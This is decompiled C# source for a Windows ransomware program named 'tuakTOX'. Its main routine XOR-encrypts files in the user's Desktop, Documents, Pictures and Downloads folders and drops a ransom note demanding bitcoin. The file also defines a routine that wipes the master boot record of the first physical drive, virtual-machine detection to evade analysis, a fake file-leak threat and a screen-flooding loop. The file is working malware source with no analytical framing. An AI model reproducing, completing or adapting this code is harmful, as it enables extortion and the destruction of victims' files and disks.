using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.Win32;

namespace tuakTOX_ransomware;

internal static class Program
{
	[UnmanagedFunctionPointer(CallingConvention.StdCall)]
	private delegate bool Wow64DisableRedirectionDelegate(out IntPtr oldValue);

	[UnmanagedFunctionPointer(CallingConvention.StdCall)]
	private delegate bool Wow64RevertRedirectionDelegate(IntPtr oldValue);

	private struct TOKEN_PRIVILEGES
	{
		public uint PrivilegeCount;

		public long Luid;

		public uint Attributes;
	}

	private const uint GENERIC_WRITE = 1073741824u;

	private const uint FILE_SHARE_WRITE = 2u;

	private const uint OPEN_EXISTING = 3u;

	private const uint FILE_ATTRIBUTE_NORMAL = 128u;

	private const uint EWX_REBOOT = 2u;

	private const uint EWX_FORCE = 4u;

	private const uint SE_SHUTDOWN_NAME = 19u;

	private const uint TOKEN_ADJUST_PRIVILEGES = 32u;

	private const uint TOKEN_QUERY = 8u;

	private const uint SHTDN_REASON_MAJOR_HARDWARE = 65536u;

	private const uint SHTDN_REASON_MINOR_DISK = 8u;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint responseOption, out uint response);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int RtlAdjustPrivilege(uint privilege, bool enable, bool currentThread, out bool enabled);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, bool disableAllPrivileges, ref TOKEN_PRIVILEGES newState, uint bufferLength, IntPtr previousState, IntPtr returnLength);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int ExitWindowsEx(uint uFlags, uint dwReason);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	private static extern IntPtr LoadLibraryA(string lpLibFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

	private static bool IsVM()
	{
		try
		{
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"))
			{
				if (registryKey != null)
				{
					string text = registryKey.GetValue("Identifier") as string;
					if (!string.IsNullOrEmpty(text) && (text.Contains("VMware") || text.Contains("VBOX")))
					{
						return true;
					}
				}
			}
			using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\ACPI\\FADT"))
			{
				if (registryKey2 != null)
				{
					string text2 = registryKey2.GetValue("OEMID") as string;
					if (!string.IsNullOrEmpty(text2) && text2.Contains("VBOX"))
					{
						return true;
					}
				}
			}
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			NetworkInterface[] array = allNetworkInterfaces;
			foreach (NetworkInterface networkInterface in array)
			{
				byte[] addressBytes = networkInterface.GetPhysicalAddress().GetAddressBytes();
				if (addressBytes.Length >= 3)
				{
					if (addressBytes[0] == 0 && addressBytes[1] == 80 && addressBytes[2] == 86)
					{
						return true;
					}
					if (addressBytes[0] == 8 && addressBytes[1] == 0 && addressBytes[2] == 39)
					{
						return true;
					}
				}
			}
		}
		catch
		{
		}
		return false;
	}

	private static void EncryptFile(string filePath, byte[] key)
	{
		try
		{
			byte[] array = File.ReadAllBytes(filePath);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] ^= key[i % key.Length];
			}
			File.WriteAllBytes(filePath, array);
		}
		catch
		{
		}
	}

	private static void EncryptDirectory(string directory, byte[] key)
	{
		try
		{
			string[] files = Directory.GetFiles(directory);
			foreach (string filePath in files)
			{
				EncryptFile(filePath, key);
			}
			string[] directories = Directory.GetDirectories(directory);
			foreach (string directory2 in directories)
			{
				EncryptDirectory(directory2, key);
			}
		}
		catch
		{
		}
	}

	private static void DropRansomNote()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = Path.Combine(folderPath, "Decryptyourfilesnow.txt");
		string contents = "* what happened?\r\n---------------------------------------------\r\nall your files are encrypted by a special encryption and you cannot restore your for it.\r\nbut you are busy looking for a way to decrypt your files.\r\n\r\n* where do i recover and get back my files back?\r\n---------------------------------------\r\nyou can get your files back by recovering it BUT... you have to pay for the ransomware.\r\nbut you only have 32 minutes to pay or i send/leak everyone your whole files and pictures in the dark web then your computer will be destroyed.\r\n\r\n* how do i pay?\r\n-------------------------------------------------------\r\nthis payment is 32$ for bitcoin only.\r\nyou must pay this bitcoin address so i can decrypt files for you.\r\nif you finished paying let me know in my email here.\r\nalshamselias@gmail.com\r\n\r\nwhat happeneds if i dont pay?\r\n--------------------------------------------------\r\nif you restart your pc your computer will get encrypted and destroy the computer.\r\nalso please note your files are stolen.";
		File.WriteAllText(path, contents);
	}

	private static void KillMBR()
	{
		IntPtr intPtr = CreateFile("\\\\.\\PhysicalDrive0", 1073741824u, 2u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		if (!(intPtr == IntPtr.Zero) && !(intPtr == (IntPtr)(-1)))
		{
			byte[] lpBuffer = new byte[512];
			WriteFile(intPtr, lpBuffer, 512u, out var _, IntPtr.Zero);
			CloseHandle(intPtr);
		}
	}

	private static void LeakFiles()
	{
		Console.WriteLine("i leaked your files to: http://gtmx56k4hutn3ikv.onion/blog/ff6b763849c49971c7ef8508064a3d8681529c7f45e532ff9e3d9ec13165263b/");
	}

	private static void Paysom()
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		Random random = new Random();
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		while (true)
		{
			int x = random.Next(0, width - 500);
			int y = random.Next(0, height - 500);
			Form val = new Form
			{
				StartPosition = (FormStartPosition)0,
				Location = new Point(x, y),
				Size = new Size(500, 500),
				Text = ""
			};
			((Control)val).Show();
			Application.DoEvents();
		}
	}

	[STAThread]
	private static void Main()
	{
		byte[] array = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		try
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		finally
		{
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		List<string> list = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			folderPath + "\\Downloads"
		};
		foreach (string item in list)
		{
			EncryptDirectory(item, array);
		}
		DropRansomNote();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new tuaktoxransomware());
	}
}
